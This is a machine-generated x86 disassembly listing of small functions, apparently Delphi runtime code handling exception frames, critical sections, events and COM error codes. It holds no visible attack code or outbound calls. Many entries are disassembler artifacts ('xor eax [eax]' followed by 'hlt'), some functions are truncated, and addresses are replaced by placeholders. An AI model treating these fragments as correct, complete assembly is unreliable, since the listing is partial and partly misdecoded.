call sub_40e7a0
retn
sub_4108c8
call sub_40e890
retn
sub_4108d0
call sub_40ec68
retn
sub_4108d8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4108ec
call sub_4108c8
retn
sub_4108f4
push ebp
mov ebp esp
call sub_4108d0
pop ebp
retn 0x8
sub_41090c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4109e8
jmp sub_4038ec
sub_410ab1
jmp sub_4038ec
sub_410ab8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ad5
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
sub_410ace
jmp sub_4038ec
sub_410ad5
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410ae0
call sub_40ecbc
retn
sub_410b57
jmp sub_4038ec
sub_410b5e
pop ebp
retn
sub_410c01
jmp sub_4038ec
sub_410c08
pop ebp
retn
sub_410d19
jmp sub_4038ec
sub_410d20
pop ebp
retn
sub_410d24
sub [ rw-data ] 0x1
retn
sub_410d58
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f3c
pop esi
pop ebx
retn
sub_411078
jmp sub_4038ec
sub_41107f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41117a
jmp sub_4038ec
sub_411181
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411380
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f27c
pop esi
pop ebx
retn
sub_411502
jmp sub_4038ec
sub_411509
pop ebp
retn
sub_41150c
sub [ rw-data ] 0x1
retn
sub_411539
jmp sub_4038ec
sub_411540
pop ebp
retn
sub_411544
sub [ rw-data ] 0x1
retn
sub_411769
xor eax [ eax ]
hlt
sub_411825
xor eax [ eax ]
hlt
sub_411881
xor eax [ eax ]
hlt
sub_4118d9
xor eax [ eax ]
hlt
sub_411931
xor eax [ eax ]
hlt
sub_411989
xor eax [ eax ]
hlt
sub_4119e1
xor eax [ eax ]
hlt
sub_411a3d
xor eax [ eax ]
hlt
sub_411a99
xor eax [ eax ]
hlt
sub_411af1
xor eax [ eax ]
hlt
sub_411b49
xor eax [ eax ]
hlt
sub_411ba9
xor eax [ eax ]
hlt
sub_411c05
xor eax [ eax ]
hlt
sub_411c61
xor eax [ eax ]
hlt
sub_411cc1
xor eax [ eax ]
hlt
sub_411d45
xor eax [ eax ]
hlt
sub_411d9d
xor eax [ eax ]
hlt
sub_411df1
xor eax [ eax ]
hlt
sub_411fcd
xor eax [ eax ]
hlt
sub_4120fd
xor eax [ eax ]
hlt
sub_4122fd
xor eax [ eax ]
hlt
sub_4123ed
xor eax [ eax ]
hlt
sub_412469
xor eax [ eax ]
hlt
sub_41267d
xor eax [ eax ]
hlt
sub_41273d
xor eax [ eax ]
hlt
sub_4127cd
xor eax [ eax ]
hlt
sub_412a75
xor eax [ eax ]
hlt
sub_412bd0
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412c79
xor eax [ eax ]
hlt
sub_412cd1
xor eax [ eax ]
hlt
sub_412cf4
mov eax [ eax + 0xc ]
call sub_413eec
retn
sub_412fcb
jmp sub_4038ec
sub_412fd2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412fd8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4140f4
test eax eax
setge al
pop esi
pop ebx
retn
sub_4132db
jmp sub_4038ec
sub_4132e2
mov esp ebp
pop ebp
retn
sub_4133b0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4133bc
push ebx
mov ebx edx
mov edx ebx
call sub_4131d0
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_412f30
sub_413468
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4135c3
jmp sub_4038ec
sub_413697
jmp sub_4038ec
sub_4136a8
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_413714
jmp sub_4038ec
sub_41371b
pop ebx
mov esp ebp
pop ebp
retn
sub_413766
jmp sub_4038ec
sub_41376d
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4137f9
jmp sub_4038ec
sub_413800
pop ebx
pop ebp
retn
sub_41387a
jmp sub_4038ec
sub_413881
pop ebx
pop ebp
retn
sub_4138c6
jmp sub_4038ec
sub_4138cd
pop ebx
pop ebp
retn
sub_413917
jmp sub_4038ec
sub_41391e
pop esi
pop ebx
pop ebp
retn
sub_413972
jmp sub_4038ec
sub_413979
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413aa6
jmp sub_4038ec
sub_413b7c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4141dc
sub_413c6c
jmp sub_4038ec
sub_413df6
jmp sub_4038ec
sub_413dfd
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413e97
jmp sub_4038ec
sub_413e9e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ebd
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413eb6
jmp sub_4038ec
sub_413ebd
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413f20
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_414238
xor edx edx
mov eax ebx
call sub_4141fc
pop ebx
retn
sub_413f98
mov eax [ ebp + 0x4 ]
retn
sub_413fce
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41401c
jmp sub_4038ec
sub_414023
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414078
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_414090
xor edx edx
call sub_414098
retn
sub_414180
mov edx [ eax + 0x8 ]
dec edx
call sub_414098
retn
sub_4142a8
retn
sub_414362
jmp sub_4038ec
sub_414369
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40350c
sub_4143f8
jmp sub_4038ec
sub_4143ff
pop ebx
pop ecx
pop ebp
retn
sub_414404
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41445b
jmp sub_4038ec
sub_414462
pop ebx
pop ecx
pop ebp
retn
sub_414468
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4144a4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
retn
sub_4144bc
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_414597
retn
sub_414598
cmp edx [ eax + 0x4 ]
jae sub_4144a4
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_414654
test edx edx
je r-xdata
xor edx edx
call sub_414668
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_41471e
jmp sub_4038ec
sub_414725
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414738
xchg edx eax
call sub_414668
retn
sub_414740
retn
sub_4147d9
jmp sub_4038ec
sub_4147e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41492a
jmp sub_4038ec
sub_414a3a
jmp sub_4038ec
sub_414a41
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a5e
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_414a57
jmp sub_4038ec
sub_414a5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ae8
jmp sub_4038ec
sub_414b00
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414bbc
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414c65
jmp sub_4038ec
sub_414c6c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c78
mov eax [ ebp + 0x4 ]
retn
sub_414cae
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414cfc
jmp sub_4038ec
sub_414d03
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414dc2
jmp sub_4038ec
sub_414dc9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414deb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f0c
retn
sub_414de4
jmp sub_4038ec
sub_414deb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414df4
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_414dfc
xor eax eax
retn
sub_414e45
jmp sub_4038ec
sub_414e4c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_414f5f
jmp sub_4038ec
sub_414f66
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ff4
jmp sub_4038ec
sub_414ffb
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4150cb
jmp sub_4038ec
sub_4150d2
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415188
jmp sub_4038ec
sub_41518f
pop esi
pop ecx
pop ebp
retn
sub_415214
jmp sub_4038ec
sub_41521b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415238
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_415231
jmp sub_4038ec
sub_415238
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4152c4
jmp sub_4038ec
sub_4152e1
jmp sub_4038ec
sub_4152e8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415324
retn
sub_4153a7
jmp sub_4038ec
sub_4153ae
mov eax [ ebp - 0x8 ]
call sub_417ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153d3
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_4153cc
jmp sub_4038ec
sub_4153d3
mov esp ebp
pop ebp
retn
sub_415423
jmp sub_4038ec
sub_41542a
pop esi
pop ecx
pop ebp
retn
sub_41547d
jmp sub_4038ec
sub_415484
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41548c
retn
sub_415507
jmp sub_4038ec
sub_41550e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4155ab
jmp sub_4038ec
sub_4155b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4155cf
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_4155c8
jmp sub_4038ec
sub_4155cf
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4155d4
retn
sub_41564e
jmp sub_4038ec
sub_415655
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41565c
mov eax edx
mov edx ecx
call sub_407dc8
retn
sub_415668
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_415680
sub_4156f8
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_415768
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415784
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415978
mov eax [ eax + 0x18 ]
retn
sub_41597c
mov eax [ eax + 0x14 ]
retn
sub_415a18
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415c24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40271c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415c60
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415c78
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415c8c
mov edx sub_415c78
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415cd4
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407dc8
retn
mov eax edx
mov edx ecx
call sub_407d90
retn
sub_415d70
retn
sub_416068
jmp sub_4038ec
sub_41606f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4160d0
jmp sub_4038ec
sub_4160d7
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41611c
mov eax [ eax + 0x4 ]
call sub_408404
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41612c
mov eax [ eax + 0x4 ]
call sub_408430
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_416168
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_416311
jmp sub_4038ec
sub_416370
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_416400
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_416450
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41663b
jmp sub_4038ec
sub_416642
mov esp ebp
pop ebp
retn
sub_4166ec
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
retn
sub_416774
mov [ eax + 0x18 ] edx
retn
sub_4167ad
xor eax [ eax ]
hlt
sub_416825
xor eax [ eax ]
hlt
sub_4168f0
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410ef8
retn
sub_416977
jmp sub_4038ec
sub_41697e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416a2a
jmp sub_4038ec
sub_416a31
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416bd5
jmp sub_4038ec
sub_416c27
jmp sub_4038ec
sub_416c46
jmp sub_4038ec
sub_416c4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c6c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416c65
jmp sub_4038ec
sub_416c6c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416d0f
jmp sub_4038ec
sub_416d97
jmp sub_4038ec
sub_416da4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
pop ebx
retn
sub_416dbc
mov eax [ rw-data ]
call sub_416da4
retn
sub_416df4
push ebx
call sub_410db0
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_416dbc
sub_416f61
jmp sub_4038ec
sub_416f68
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403ee8
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_417088
jmp sub_4038ec
sub_41708f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417186
jmp sub_4038ec
sub_4171a3
jmp sub_4038ec
sub_4171aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4172a8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415cf0
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41736c
push ebx
mov ebx eax
mov eax ebx
call sub_418d20
cmp al 0x9
sete al
pop ebx
retn
sub_4173cb
jmp sub_4038ec
sub_4173d2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417478
jmp sub_4038ec
sub_41747f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4176fe
jmp sub_403638
sub_41772a
jmp sub_403638
sub_4177cc
jmp sub_403638
sub_41786f
jmp sub_403638
sub_417a47
jmp sub_403638
sub_417a89
jmp sub_4038ec
sub_417ab9
jmp sub_4038ec
sub_417ac0
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417b2f
jmp sub_4038ec
sub_417c06
jmp sub_4038ec
sub_417c0d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ee0
mov dl 0x1
call sub_416e48
retn
sub_418021
jmp sub_4038ec
sub_418028
pop ebx
mov esp ebp
pop ebp
retn
sub_418030
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418e30
mov eax [ rw-data ]
call sub_416da4
pop ebp
retn
j_sub_403764#2
jmp sub_403764
j_sub_403764#3
jmp sub_403764
sub_41821c
jmp sub_4038ec
sub_418223
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418303
jmp sub_4038ec
sub_41830a
mov esp ebp
pop ebp
retn
sub_4183c2
jmp sub_4038ec
sub_4183c9
pop ecx
pop ecx
pop ebp
retn
sub_4186cb
jmp sub_4038ec
sub_4186d2
pop ebx
mov esp ebp
pop ebp
retn
sub_418977
jmp sub_4038ec
sub_41897e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403198
retn
sub_418997
jmp sub_4038ec
sub_4189bb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403638
sub_4189f2
jmp sub_403638
sub_418a31
jmp sub_4038ec
sub_418a38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a5a
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f0c
retn
sub_418a53
jmp sub_4038ec
sub_418a5a
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418ae1
jmp sub_403638
sub_418b0e
jmp sub_4038ec
sub_418b15
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418b20
push ecx
mov edx esp
mov ecx 0x4
call sub_4172e4
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416da4
sub_418c2d
jmp sub_4038ec
sub_418c34
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418d13
jmp sub_4038ec
sub_418d1a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418d70
jmp sub_4038ec
sub_418d77
pop ebx
pop ecx
pop ebp
retn
sub_418fbf
jmp sub_4038ec
sub_418fc6
pop ecx
pop ecx
pop ebp
retn
sub_419009
jmp sub_4038ec
sub_419010
pop ebx
pop ecx
pop ebp
retn
sub_4190ac
jmp sub_4038ec
sub_4190b3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419161
jmp sub_4038ec
sub_419168
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419174
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4193cf
jmp sub_4038ec
sub_4193d6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193fb
mov eax [ ebp - 0x8 ]
call sub_403198
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_4193f4
jmp sub_4038ec
sub_4193fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419420
lea eax [ ebp - 0x1c ]
call sub_405634
lea eax [ ebp - 0x18 ]
call sub_403ee8
retn
sub_419419
jmp sub_4038ec
sub_419420
pop ebx
mov esp ebp
pop ebp
retn
sub_419632
jmp sub_4038ec
sub_419639
pop ebx
mov esp ebp
pop ebp
retn
sub_41968c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415f54
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_4196a4
test dl dl
je r-xdata
mov dl 0x8
call sub_419828
retn
mov dl 0x9
call sub_419828
retn
sub_41972c
mov dl 0x1
call sub_419828
retn
sub_419734
xor edx edx
call sub_419828
retn
sub_419819
jmp sub_4038ec
sub_419820
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41983c
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40ce50
sub_419870
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_419888
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419894
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_419888
sub_4199ba
jmp sub_403638
sub_4199e9
jmp sub_4038ec
sub_419a1f
jmp sub_4038ec
sub_419a26
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a45
push rw-data
call LeaveCriticalSection
retn
sub_419a3e
jmp sub_4038ec
sub_419a45
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419b14
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419cf0
sub_419b74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417e30
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419b88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417e30
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_419b9c
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_4196b8
retn
sub_419ba8
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_4196b8
retn
sub_419e50
xor eax eax
retn
sub_419e54
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419e5c
xor eax eax
retn
sub_419e60
retn
sub_419e64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f3c
pop esi
pop ebx
retn
sub_419e78
mov eax [ eax + 0x4 ]
retn
sub_419e7c
retn
sub_419e80
xor eax eax
retn
sub_419e84
retn
sub_419e88
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419e94
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_419ea0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_419eac
retn
sub_419eb0
xchg edx eax
call sub_417ad4
retn
sub_419eb8
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_419f40
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403394
pop esi
retn
sub_419f54
retn
sub_41a034
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f3c
pop esi
pop ebx
retn
sub_41a074
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41a1c0
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4033e0
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41a1d8
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41a260
retn
sub_41a2a8
retn
sub_41a2e0
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41a2f8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41a51c
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403394
pop esi
pop ebx
retn
sub_41a340
mov al 0x1
retn
sub_41a344
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a34c
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41a3f4
xor eax eax
retn
sub_41a3f8
retn
sub_41a424
retn
sub_41a4bc
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41a4d0
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413eec
retn
sub_41a617
jmp sub_403638
sub_41a61c
mov ebx 0x1
call sub_4039a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a67f
jmp sub_403638
sub_41a684
mov ebx 0x80030103
call sub_4039a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a702
jmp sub_403638
sub_41a707
mov ebx 0x80030009
call sub_4039a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a765
jmp sub_403638
sub_41a76a
mov ebx 0x8000ffff
call sub_4039a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a935
jmp sub_4038ec
sub_41a946
jmp sub_403638
sub_41a94b
mov [ ebp - 0x4 ] 0x8000ffff
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a974
lea eax [ ebp + 0xc ]
call sub_405634
retn
sub_41a96d
jmp sub_4038ec
sub_41a974
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a980
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a98c
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a998
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a9a4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41aa13
jmp sub_403638
sub_41aa18
mov esi 0x8000ffff
call sub_4039a0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41aa2c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41aa99
jmp sub_4038ec
sub_41aaa0
mov eax [ rw-data ]
call sub_403198
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41aab0
call sub_413838
retn
sub_41ab78
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41ad1c
jmp sub_4038ec
sub_41ad23
pop ebp
retn
sub_41adb1
jmp sub_4038ec
sub_41adb8
pop ebp
retn
sub_41b0a1
jmp sub_4038ec
sub_41b0a8
pop ebp
retn
sub_41b0ac
sub [ rw-data ] 0x1
retn
sub_41b101
xor eax [ eax ]
hlt
sub_41b15d
xor eax [ eax ]
hlt
sub_41b43d
xor eax [ eax ]
hlt
sub_41b511
xor eax [ eax ]
hlt
sub_41b68d
xor eax [ eax ]
hlt
sub_41b78d
xor eax [ eax ]
hlt
sub_41bc3e
cld
jmp [ ecx + eax ]
sub_41bd0d
xor eax [ eax ]
hlt
sub_41be4d
xor eax [ eax ]
hlt
sub_41bf95
xor eax [ eax ]
hlt
sub_41c094
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41c0dd
xor eax [ eax ]
hlt
sub_41c108
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41c17c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41c188
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41c268
jmp sub_4038ec
sub_41c26f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c2ff
jmp sub_4038ec
sub_41c391
jmp sub_4038ec
sub_41c398
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c3fc
